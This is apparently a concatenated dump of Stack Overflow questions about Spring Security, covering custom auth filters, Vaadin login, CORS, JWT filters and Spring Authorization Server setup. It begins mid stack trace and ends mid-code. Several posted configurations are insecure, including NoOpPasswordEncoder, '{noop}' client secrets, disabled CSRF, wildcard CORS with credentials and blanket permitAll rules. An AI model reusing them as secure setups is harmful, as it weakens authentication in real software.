    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.1.5.jar:6.1.5]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.0.14.jar:6.0.14]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.0.14.jar:6.0.14]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.0.14.jar:6.0.14]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:340) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.16.jar:10.1.16]
    at java.base/java.lang.Thread.run(Thread.java:1583) ~[na:na]
</code></pre>
<p><strong>CustomAuthentication.java</strong></p>
<pre class=""lang-java prettyprint-override""><code>@AllArgsConstructor
@Getter
@Setter
public class CustomAuthentication implements Authentication {

    private final boolean isAuthenticated;
    private final String key;

    @Override
    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {
        return List.of(() -&gt; &quot;USER&quot;);
    }

    @Override
    public Object getCredentials() {
        return null;
    }

    @Override
    public Object getDetails() {
        return null;
    }

    @Override
    public Object getPrincipal() {
        return null;
    }

    @Override
    public boolean isAuthenticated() {
        return this.isAuthenticated;
    }

    @Override
    public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException { }

    @Override
    public boolean equals(Object another) {
        return false;
    }

    @Override
    public String getName() {
        return &quot;CustomAuthentication&quot;;
    }

    @Override
    public boolean implies(Subject subject) {
        return Authentication.super.implies(subject);
    }
}
</code></pre>
<p><strong>CustomAuthenticationProvider.java</strong></p>
<pre class=""lang-java prettyprint-override""><code>@Component
public class CustomAuthenticationProvider implements AuthenticationProvider {

    @Value(&quot;${our.key}&quot;)
    private String key;

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        CustomAuthentication ca = (CustomAuthentication) authentication;

        String headerKey = ca.getKey();
        if(null != headerKey &amp;&amp; headerKey.equals(key)) {
            return new CustomAuthentication(true, null);
        }
        return authentication;
    }

    @Override
    public boolean supports(Class&lt;?&gt; authentication) {
        return CustomAuthentication.class.isAssignableFrom(authentication);
    }
}
</code></pre>
<p><strong>CustomAuthenticationManager.java</strong></p>
<pre class=""lang-java prettyprint-override""><code>@Component
@AllArgsConstructor
public class CustomAuthenticationManager implements AuthenticationManager {

    private final CustomAuthenticationProvider cap;

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        if(cap.supports(authentication.getClass())) {
            return cap.authenticate(authentication);
        }

        return authentication;
    }
}
</code></pre>
<p><strong>CustomFilter.java</strong></p>
<pre class=""lang-java prettyprint-override""><code>@Component
@AllArgsConstructor
public class CustomFilter extends OncePerRequestFilter {

    private final CustomAuthenticationManager cam;

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        CustomAuthentication ca = new CustomAuthentication(false, request.getHeader(&quot;key&quot;));
        Authentication authentication = cam.authenticate(ca);

        SecurityContext securityContext = SecurityContextHolder.createEmptyContext();
        securityContext.setAuthentication(authentication);

        SecurityContextHolder.setContext(securityContext);

        filterChain.doFilter(request, response);
        return;
    }
}
</code></pre>
<p><strong>WebSecurityConfig.java</strong></p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@AllArgsConstructor
@EnableWebSecurity
public class WebSecurityConfig {

    private final CustomFilter customFilter;

    @Bean
    public WebSecurityCustomizer webSecurityCustomizer() {
        return web -&gt; web.ignoring().requestMatchers(&quot;/public/**&quot;);
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .authorizeHttpRequests(authorizeConfig -&gt; {
                    authorizeConfig.anyRequest().authenticated();
                })
                .httpBasic(Customizer.withDefaults())
                .addFilterBefore(customFilter, BasicAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return NoOpPasswordEncoder.getInstance();
    }
}
</code></pre>
<p><strong>JpaUserDetailsService.java</strong></p>
<pre class=""lang-java prettyprint-override""><code>@AllArgsConstructor
@Service
public class JpaUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String username) {
        System.out.println(&quot;UserDetailsService is called&quot;);
        User user = userRepository.findByName(username);
        System.out.println(&quot;User: &quot; + user.getUsername() + &quot; accessed the pages&quot;);
        return new SecurityUser(user);
    }
}
</code></pre>
"
"<p>I'm developing an e-learning platform where users are associated with formations, groups, departments, etc. I'm considering using Keycloak for authentication. However, all user data is stored in a single database, and I'm unable to establish direct relationships between users and other tables due to limitations. Can I still effectively implement Keycloak for authentication in this scenario?</p>
<p>Can I still effectively implement Keycloak for authentication in this scenario?</p>
"
"<p>So, i tried the Vaadin login component as in the tutorial <a href=""https://vaadin.com/docs/latest/security/enabling-security"" rel=""nofollow noreferrer"">https://vaadin.com/docs/latest/security/enabling-security</a> and it works like a charm.</p>
<p>Now I'm trying to customize the login form but whenever I log in, I get logged out when i try to navigate to any other pages. Please help.</p>
<p>Login Form:</p>
<pre><code>        @Route(&quot;login&quot;)
        @PageTitle(&quot;Login&quot;)
        @AnonymousAllowed
        
        public class LoginViewOverLay extends Div implements BeforeEnterObserver, ComponentEventListener&lt;AbstractLogin.LoginEvent&gt; {
       
            
            @Autowired
            private AuthenticationManager authenticationManager;
            @Autowired
            SecurityService securityservice;
            @Autowired UserDetailsServiceImpl userdetails;
            FormLayout form = new FormLayout();
            LoginOverlay loginOverlay = new LoginOverlay();
            public LoginViewOverLay() {
                add(loginOverlay);
                loginOverlay.setOpened(true);
                loginOverlay.addLoginListener(this);
            }
            
            @Override
            public void onComponentEvent(AbstractLogin.LoginEvent loginEvent) {

                try {
                    securityservice.authenticateUser(loginEvent.getUsername(), loginEvent.getPassword());
                    loginOverlay.close();
                    getUI().ifPresent(ui -&gt; ui.navigate(&quot;/&quot;));
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        
            @Override
            public void beforeEnter(BeforeEnterEvent beforeEnterEvent) {
                if(beforeEnterEvent.getLocation()
                    .getQueryParameters()
                    .getParameters()
                    .containsKey(&quot;error&quot;)) {
                    loginOverlay.setError(true);
                }
            }
          
        }
</code></pre>
<p>My Security service class:</p>
<pre><code>@Component
public class SecurityService {
    @Autowired
    UserDetailsServiceImpl userdetails;
    @Autowired
    PasswordEncoder encoder;
    private final AuthenticationContext authenticationContext;

    public SecurityService(AuthenticationContext authenticationContext) {
        this.authenticationContext = authenticationContext;
    }

    public UserDetails getAuthenticatedUser() {
        return authenticationContext.getAuthenticatedUser(UserDetails.class).get();
    }

    public void logout() {
        authenticationContext.logout();
    }
    public UserDetails getAuthenticatedUser2() {
        SecurityContext context = SecurityContextHolder.getContext();
        Object principal = context.getAuthentication().getPrincipal();
        if (principal instanceof UserDetails) {
            return (UserDetails) context.getAuthentication().getPrincipal();
        }
        // Anonymous or no authentication.
        return null;
    }
    
    public void authenticateUser(UserDetails userDetails) {
        Authentication authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
        SecurityContextHolder.getContext().setAuthentication(authentication);
    }
    public void authenticateUser(String username, String password) {
        UserDetails userDetails = userdetails.loadUserByUsername(username);
        if (encoder.matches(password, userDetails.getPassword())) {
            Authentication authentication = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
            SecurityContextHolder.getContext().setAuthentication(authentication);
          
        } else {
           // System.out.println(&quot;wrong&quot;);
        }
    }
}
</code></pre>
<p>My User Details Class:</p>
<pre><code>@Service
public class UserDetailsServiceImpl implements UserDetailsService {
    private final UserRepository userRepository;
    
    public UserDetailsServiceImpl(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    @Transactional
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        UserLogin user = userRepository.findByUserNameAndEnabled(username, true);
        if (user == null) {
            throw new UsernameNotFoundException(&quot;No user present with username: &quot; + username);
        } else {
            //System.out.println(&quot;Yes User&quot;);
            return new User(user.getUserName(), user.getHashedPassword(), getAuthorities(user));
            
        }

    }

    private static List&lt;GrantedAuthority&gt; getAuthorities(UserLogin user) {
       return user.getRoles().stream().map(role -&gt; new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.getRoleName()))
                .collect(Collectors.toList());
      

    }
    
}
</code></pre>
<p>Security Configuration class:</p>
<pre><code>@EnableWebSecurity
@Configuration
public class SecurityConfiguration extends VaadinWebSecurity {

    @Autowired
    UserDetailsServiceImpl userdetails;
    
    @Bean
    PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }
    

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(authorize -&gt; authorize
                .requestMatchers(AntPathRequestMatcher.antMatcher(HttpMethod.GET, &quot;/images/*.png&quot;)).permitAll()
                // .requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;,
                // HttpMethod.POST.toString())).permitAll()
                .requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;, HttpMethod.DELETE.toString())).denyAll()
                .requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;, HttpMethod.OPTIONS.toString())).denyAll()
                .requestMatchers(AntPathRequestMatcher.antMatcher(HttpMethod.OPTIONS, &quot;/**&quot;)).denyAll()
                
        ).sessionManagement(session -&gt; session

                        .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED).invalidSessionUrl(&quot;/&quot;)
                        .maximumSessions(1).sessionRegistry(sessionRegistry()).expiredUrl(&quot;/&quot;)
                        .maxSessionsPreventsLogin(false));

        super.configure(http);
    setLoginView(http, LoginViewOverLay.class);
    
    }
    
    @Bean
    SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }
    

}
</code></pre>
"
"<p>i have been trying to figure out this problem for days now and i am still struggling to solve it. Cuurently, i am trying to create an ecommerce web application with react front end and spring boot backend and Spring Security is causing problems.</p>
<p>this is my currect appconfig</p>
<pre class=""lang-java prettyprint-override""><code>@EnableWebSecurity
@Configuration
public class AppConfig{

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { // do debugging on this to see if it reaches

        http
            .cors((cors) -&gt; cors
                .configurationSource(apiConfigurationSource())
            );

        return http.build();
    }

    CorsConfigurationSource apiConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList(&quot;*&quot;));
        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;,&quot;POST&quot;));
        configuration.setAllowCredentials(true);
        configuration.addAllowedHeader(&quot;*&quot;);
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);
        return source;
    }
</code></pre>
<p>what i am trying to call</p>
<pre class=""lang-java prettyprint-override""><code>@PostMapping(&quot;/signup&quot;)
public ResponseEntity&lt;AuthResponse&gt; createUserHandler(@RequestBody User user) throws UserException{
        
    String email = user.getEmail();

    String password = user.getPassword();

    String firstName = user.getFirstName();

    String lastName = user.getLastName();

    User isEmailExist = userRepository.findByEmail(email);

    if(isEmailExist != null){
        throw new UserException(&quot;Email is Already Used...Please create account with another email&quot;);
    }

    User createdUser = new User();

    createdUser.setEmail(email);
    createdUser.setPassword(passwordEncoder.encode(password));
    createdUser.setFirstName(firstName);
    createdUser.setLastName(lastName);

    User savedUser = userRepository.save(createdUser);
    Cart cart = cartAPIService.createCart(savedUser);

    Authentication authentication = new UsernamePasswordAuthenticationToken(savedUser.getEmail(), savedUser.getPassword());
    SecurityContextHolder.getContext().setAuthentication(authentication);
    
    String token = jwtProvider.generateToken(authentication);

    AuthResponse authResponse = new AuthResponse();

    authResponse.setJwt(token);
    authResponse.setMessage(&quot;Sign up is successful...&quot;);

    return new ResponseEntity&lt;AuthResponse&gt;(authResponse,HttpStatus.CREATED);
}
</code></pre>
<p>more details on error</p>
<pre><code>Access to XMLHttpRequest at 'http://localhost:5454//auth/signup' from origin 'http://localhost:3000' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.
</code></pre>
<p>i would really appreciate it if this problem is resolved</p>
<p>I have tried to solving using controller cors but no results</p>
<p>Edit:
A follow up I have realized that my response headers are empty in network inspection</p>
<p><a href=""https://i.stack.imgur.com/lMGsG.png"" rel=""nofollow noreferrer"">Image of network during page inspection</a></p>
<p>I have also changed the origins to allow all</p>
<pre><code>configuration.setAllowedOrigins(Arrays.asList(&quot;*&quot;));
</code></pre>
<p>Still doesn't work I don't really know why anymore</p>
"
"<p>I am working on a decoupled react.js and Java with Spring Boot application and have just finished the first part of the backend. I admittedly don't have a firm grasp of Spring Security when it comes to using JWTs but I have been following along with a video tutorial and have read the docs to the best of my ability. Unfortunately, the tutorial is somewhat outdated and I've had to refactor certain parts of it to account for deprecations. I have apparently made an error at some point and can't figure out what I did wrong.</p>
<p>When I go to localhost:8080 (the port the backend is running on), I get a 403 error. This suggested to me that it was an issue with the <code>SecurityConfiguration</code> so I verified that the &quot;/&quot; endpoint was in the <code>permitAll()</code> line and it was. Here is my entire <code>SecurityConfiguration</code>:</p>
<pre><code>package com.keyoflife.keyoflife.config;

import com.keyoflife.keyoflife.services.UserDetailsLoader;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpMethod;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import java.util.Arrays;

@Configuration
@EnableWebSecurity
@Order(Ordered.HIGHEST_PRECEDENCE)
public class SecurityConfiguration {
    private final UserDetailsLoader usersLoader;
    private final JwtFilter jwtFilter;
    public SecurityConfiguration(UserDetailsLoader usersLoader, JwtFilter jwtFilter) {
        this.usersLoader = usersLoader;
        this.jwtFilter = jwtFilter;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        //TODO: remove this
        //get the hashed version of 'asdfasdf' to save in db
        //System.out.println(new BCryptPasswordEncoder().encode(&quot;asdfasdf&quot;));
        return new BCryptPasswordEncoder();
    }
    @Bean
    public AuthenticationManager authenticationManager(HttpSecurity http, PasswordEncoder passwordEncoder)
            throws Exception {
        AuthenticationManagerBuilder authenticationManagerBuilder = http.getSharedObject(AuthenticationManagerBuilder.class);
        authenticationManagerBuilder.userDetailsService(usersLoader).passwordEncoder(passwordEncoder);
        return authenticationManagerBuilder.build();
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
                .csrf(AbstractHttpConfigurer::disable)
                .cors(Customizer.withDefaults())
                .authorizeHttpRequests(auth -&gt; auth
                        .requestMatchers(&quot;/user-dash&quot;).authenticated()
                        .requestMatchers(HttpMethod.OPTIONS,&quot;/api/auth/**&quot;, &quot;/login&quot;, &quot;/&quot;).permitAll()
                )
                .sessionManagement(sess -&gt; sess.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .httpBasic(Customizer.withDefaults())
                .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
                .formLogin((login) -&gt; login
                        .loginPage(&quot;/login&quot;)
                        .failureUrl(&quot;/login&quot;)
                        .defaultSuccessUrl(&quot;/user-dash&quot;))
                /* Logout configuration */
                .logout((logout) -&gt; logout
                        .logoutSuccessUrl(&quot;/&quot;))
                .build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.addAllowedOrigin(&quot;http://127.0.0.1:8080&quot;);
        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));
        configuration.setAllowedHeaders(Arrays.asList(&quot;Content-Type&quot;, &quot;Authorization&quot;));
        configuration.setAllowCredentials(true); // for cookies. bc everyone likes cookies

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);
        return source;
    }

}
</code></pre>
<p>Next, I went through the stack trace and saw that the error actually occurred in my <code>JWTFilter</code> on the <code>chain.doFilter</code> line seen here in the first <code>if()</code> statement of the <code>doFilterInternal</code> method: I will post the first part of this class as the rest seems inconsequential since the code isn't getting passed the first return:</p>
<pre><code>protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException {

        // Get authorization header and validate
        final String header = request.getHeader(&quot;Authorization&quot;);
        System.out.println(header);
        //ensure header has text and starts with &quot;Bearer &quot;
        if (!StringUtils.hasText(header) || (StringUtils.hasText(header) &amp;&amp; !header.startsWith(&quot;Bearer &quot;))) {
            chain.doFilter(request, response); //Access Denied Exception thrown here because header is null
            return;
        }

//rest of method below

}
</code></pre>
<p>I added the <code>System.out</code> line to see what the value of <code>header</code> was, and found that when I try to go to localhost8080, that value is &quot;Basic (alpha-numeric string)&quot; but when I try to access the /api/auth/login endpoint with</p>
<pre><code>{
    &quot;username&quot;:&quot;testUser&quot;,
    &quot;password&quot;: &quot;asdfasdf&quot;
}
</code></pre>
<p>using Postman with a JSON body and POST method, I get a 401 error and a null <code>header</code>. I did verify that this is an actual user in my db.</p>
<p>I have seen several other SO posts regarding this issue and have read through them all. Several of the posts suggest to add a cors config which I have (see <code>SecurityConfiguration</code> code). Another says to add the &quot;Authorization&quot; arg to the <code>getHeader</code> line in the <code>JWTFilter</code> which I already have. I'm at a loss for where to go from here and so this is my first SO post ever. I've been reading SO for years now but never got so stuck that I needed to ask a question before. I apologize if I've left something pertinent out. Please let me know and I'll edit my question. I just didn't want to flood the post with extraneous code.</p>
"
"<p>I am trying to apply authentication to a springboot application using spring security 6 but the application stops running when I create a bean of AuthenticationProvider and add it to the filterChain. Otherwise, the application seems to be starting up.</p>
<p>Currently I have allowed all routes to be permitted for testing purposes.</p>
<p><strong>SecurityConfig.java</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

@Autowired
private UserService userDetailsService;

@Autowired
private BCryptPasswordEncoder encoder;



@Bean
public AuthenticationProvider authenticationProvider() {
    DaoAuthenticationProvider daoAuthenticationProvider = new DaoAuthenticationProvider();
    daoAuthenticationProvider.setUserDetailsService(userDetailsService);
    daoAuthenticationProvider.setPasswordEncoder(encoder);
    return daoAuthenticationProvider;

}

@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .cors((cors) -&gt; cors.configurationSource(apiConfigurationSource()))
        .csrf(csrf -&gt; csrf.ignoringRequestMatchers(&quot;**&quot;))
        .authorizeHttpRequests(authorize -&gt; authorize
            .requestMatchers(&quot;**&quot;).permitAll()
            .anyRequest().authenticated()
        )
        .authenticationProvider(authenticationProvider())
        .httpBasic(Customizer.withDefaults());
    return http.build();
}
</code></pre>
<p>}</p>
<p><strong>UserService.java</strong></p>
<pre><code>@Service
@RequiredArgsConstructor
public class UserService implements UserDetailsService{

@Autowired
UserRepoImpl userRepoImpl;

final PasswordEncoder passwordEncoder;
final JwtService jwtService;
final AuthenticationManager authenticationManager;
final UserDetailsService userDetailsService;


@Autowired
private PasswordEncoder encoder;

Integer getSessionDuration(RegisterUser user) {
    long sessionDuration = GlobalVariablesBackend.getRoleDuration(user.getRole());
    Integer intVal = Math.toIntExact(sessionDuration);
    return intVal;
}

@Override
public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException 
{
    System.out.println(&quot;in user details service -&gt; &quot;+username);
    RegisterUser user = userRepoImpl.findByUsername(username);
    
    String jwtToken = jwtService.generateToken(user, user.getRole());
    
    AuthenticationResponse authResponse = new AuthenticationResponse();
    authResponse.setEmail(user.getEmail());
    authResponse.setRole(user.getRole());
    authResponse.setSessionDuration(getSessionDuration(user));
    authResponse.setToken(jwtToken);
    authResponse.setUsername(username);
    
    return authResponse;
}

}
</code></pre>
<p><strong>RegisterUser.java</strong></p>
<pre><code>@Entity
@Table(name = &quot;pushcode_users&quot;)
@Data
@Builder
@AllArgsConstructor
@NoArgsConstructor
@ToString
public class RegisterUser implements UserDetails{


@Id
@NotNull
@Email
@Column(unique=true)
String email;

@NotNull
String password;


@Column(name=&quot;created_date&quot;)
@CreationTimestamp
LocalDateTime createdDate;

@Column(name=&quot;last_login&quot;)
@UpdateTimestamp
LocalDateTime lastLogin;

@Enumerated(EnumType.STRING)
Role role;

@NotNull
@Column(name=&quot;username&quot;)
String username;

@Transient
String confirmPassword;

@Override
public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {
    return List.of(new SimpleGrantedAuthority(role.name()));
}

@Override
public String getUsername() {
    return email;
}

@Override
public boolean isAccountNonExpired() {
    return true;
}

@Override
public boolean isAccountNonLocked() {
    return true;
}

@Override
public boolean isCredentialsNonExpired() {
    return true;
}

@Override
public boolean isEnabled() {
    return true;
}

}
</code></pre>
<p><strong>AuthenticationResponse</strong></p>
<pre><code>@Data
@AllArgsConstructor
@NoArgsConstructor
public class AuthenticationResponse extends RegisterUser{

@JsonProperty(access = Access.WRITE_ONLY)
private String token;
private Role role;
private String username;
private String email;
private Integer sessionDuration;

}
</code></pre>
<p>From my understanding, the routes that need to be authenticated would be sent to AuthenticationProvider which calls loadUserByUsername that is implemented in UserService.
RegisterUser is the DAO for UserDetails and AuthenticationResponse is a DTO.</p>
<p>Would really appreciate any help or suggestions regarding this matter.</p>
"
"<p>Using the latest Spring Authorization Server, how would one go about creating a user registration flow? After creating a controller endpoint for registration along with the corresponding .html page, what would be the proper next steps for saving the user and generating a token?</p>
<p>To expand on the use case</p>
<ol>
<li>User click Signup link from client app</li>
<li>Auth server registration page is displayed</li>
<li>On submit, user is created in Auth server, jwt created with a ROLE_SIGNUP role.</li>
<li>Auth server redirects back to client app where user completes the registration process.</li>
</ol>
<p>I've looked all over in various github repos and elsewhere trying to find some sort of hints without luck, hoping for some sort of direction.</p>
"
"<p>when I made a simple authorization server with <code>org.springframework.security:spring-security-oauth2-authorization-server:1.2.2</code> library.</p>
<p>I found a document on <a href=""https://docs.spring.io/spring-authorization-server/reference"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-authorization-server/reference</a></p>
<p>And I tried to do like this document....</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
public class SecurityConfiguration {


    @Bean
    public SecurityFilterChain securityFilterChain( HttpSecurity http ) throws Exception {
        http
                .authorizeHttpRequests( ( authorize ) -&gt; authorize
                        .requestMatchers( &quot;/oauth2/**&quot; ).authenticated()
                        .anyRequest().permitAll()
                )
                .httpBasic( Customizer.withDefaults() )
                .formLogin( Customizer.withDefaults() )
                .cors( httpSecurityCorsConfigurer -&gt; httpSecurityCorsConfigurer.disable())
                .csrf( httpSecurityCsrfConfigurer -&gt; httpSecurityCsrfConfigurer.disable());


        return http.build();
    }

    @Bean
    public AuthorizationServerSettings authorizationServerSettings(  ){

        return AuthorizationServerSettings.builder()
                .issuer( &quot;http://localhost:8000&quot; )
                .tokenEndpoint( &quot;/oauth2/v1/token&quot; )
                .tokenIntrospectionEndpoint( &quot;/oauth2/v1/verify&quot; )
                .build();
    }

    @Bean
    public OAuth2AuthorizationService authorizationService(){
        return new InMemoryOAuth2AuthorizationService();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository(){

        RegisteredClient client = RegisteredClient.withId( UUID.randomUUID().toString() )
                .clientId( &quot;user&quot; )
                .clientSecret( &quot;{noop}user&quot; )
                .clientAuthenticationMethod( ClientAuthenticationMethod.CLIENT_SECRET_BASIC )
                .authorizationGrantType( AuthorizationGrantType.AUTHORIZATION_CODE )
                .authorizationGrantType( AuthorizationGrantType.CLIENT_CREDENTIALS )
                .authorizationGrantType( AuthorizationGrantType.REFRESH_TOKEN )
                .redirectUri( &quot;http://localhost:8000/redirect&quot; )
                .tokenSettings( TokenSettings.builder().accessTokenTimeToLive( Duration.ofDays( 1 ) ).build() )
                .clientSettings( ClientSettings.builder()
                        .build() )
                .build();


        return new InMemoryRegisteredClientRepository( client );
    }

    @Bean
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {

        OAuth2AuthorizationServerConfigurer authorizationServerConfigurer =
                new OAuth2AuthorizationServerConfigurer();

        http.apply( authorizationServerConfigurer );

        authorizationServerConfigurer
